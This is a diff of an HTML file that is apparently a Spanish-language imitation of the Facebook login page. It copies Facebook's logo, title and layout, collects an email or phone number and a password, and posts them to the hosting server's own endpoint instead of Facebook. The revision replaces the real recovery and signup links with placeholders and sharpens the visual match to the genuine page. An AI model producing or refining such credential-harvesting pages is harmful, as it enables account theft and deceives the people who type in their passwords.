@@ -1,101 +1,148 @@
-<!DOCTYPE html>
-<html lang="es" id="facebook" class="no_js">
+<html lang="es">
 
 <head>
-    <meta charset="utf-8" />
-    <title>Iniciar sesión en Facebook</title>
-    <meta name="description"
-        content="Inicia sesión en Facebook para empezar a compartir y conectarte con tus amigos, tus familiares y las personas que conoces." />
-    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yB/r/2sFJRNmJ5OP.ico" />
-</head>
-
-<body>
-    <div class="content">
-        <div class="login-container">
-            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook" />
-            <form id="login_form" action="/login" method="post">
-                <div>
-                    <input type="text" class="form-input" name="email" id="email"
-                        placeholder="Correo electrónico o número de teléfono" required />
-                </div>
-                <div>
-                    <input type="password" class="form-input" name="pass" id="pass" placeholder="Contraseña" required />
-                </div>
-                <div>
-                    <button type="submit" class="login-button">Iniciar sesión</button>
-                </div>
-                <div>
-                    <a href="https://www.facebook.com/recover/initiate">¿Olvidaste tu contraseña?</a>
-                </div>
-                <div>
-                    <a href="https://www.facebook.com/r.php">Crear cuenta nueva</a>
-                </div>
-            </form>
-        </div>
-    </div>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Inicia sesión en Facebook</title>
     <style>
         body {
-            font-family: Helvetica, Arial, sans-serif;
+            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
             background-color: #f0f2f5;
-            margin: 0;
-            padding: 0;
-        }
-
-        .content {
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
+            height: 100vh;
+            margin: 0;
         }
 
-        .login-container {
-            background-color: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-            text-align: center;
-        }
-
-        .form-input {
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
             width: 100%;
-            padding: 14px 16px;
-            margin: 6px 0;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            font-size: 17px;
+            max-width: 400px;
+            padding: 20px;
+        }
+
+        .logo {
+            width: 240px;
+            height: auto;
+            margin: -20px 0 10px;
+        }
+
+        .login-box {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            padding: 20px;
+            width: 100%;
             box-sizing: border-box;
         }
 
-        .login-button {
-            background-color: #1877f2;
-            color: white;
+        .login-box p {
+            font-size: 18px;
+            text-align: center;
+            color: #1c1e21;
+            margin-bottom: 20px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
             padding: 14px 16px;
+            font-size: 17px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            margin-bottom: 12px;
+            box-sizing: border-box;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        button {
+            width: 100%;
+            background-color: #1877f2;
+            color: #fff;
             border: none;
             border-radius: 6px;
             font-size: 20px;
             font-weight: bold;
-            width: 100%;
-            margin: 6px 0;
+            padding: 12px;
             cursor: pointer;
+            margin-bottom: 16px;
         }
 
-        .login-button:hover {
+        button:hover {
             background-color: #166fe5;
         }
 
-        a {
+        .forgot-password {
             color: #1877f2;
-            text-decoration: none;
             font-size: 14px;
+            text-align: center;
             display: block;
-            margin: 10px 0;
-        }
-
-        img {
-            width: 240px;
+            text-decoration: none;
             margin-bottom: 20px;
         }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin-bottom: 20px;
+        }
+
+        .create-account {
+            display: block;
+            width: fit-content;
+            margin: 0 auto;
+            background-color: #42b72a;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: bold;
+            padding: 14px 16px;
+            text-decoration: none;
+        }
+
+        .create-account:hover {
+            background-color: #36a420;
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #737373;
+            text-align: center;
+        }
     </style>
+</head>
+
+<body>
+    <div class="container">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook" class="logo">
+        <div class="login-box">
+            <p>Inicia sesión en Facebook</p>
+            <form action="/" method="post">
+                <input type="text" name="email" placeholder="Correo electrónico o número de teléfono" required>
+                <input type="password" name="password" placeholder="Contraseña" required>
+                <button type="submit">Iniciar sesión</button>
+            </form>
+            <a href="#" class="forgot-password">¿Has olvidado la contraseña?</a>
+            <div class="divider"></div>
+            <a href="#" class="create-account">Crear cuenta nueva</a>
+        </div>
+        <div class="footer">
+            <p>Español (España) English (US) Português (Brasil) Français (France) Italiano</p>
+        </div>
+    </div>
 </body>
 
 </html>
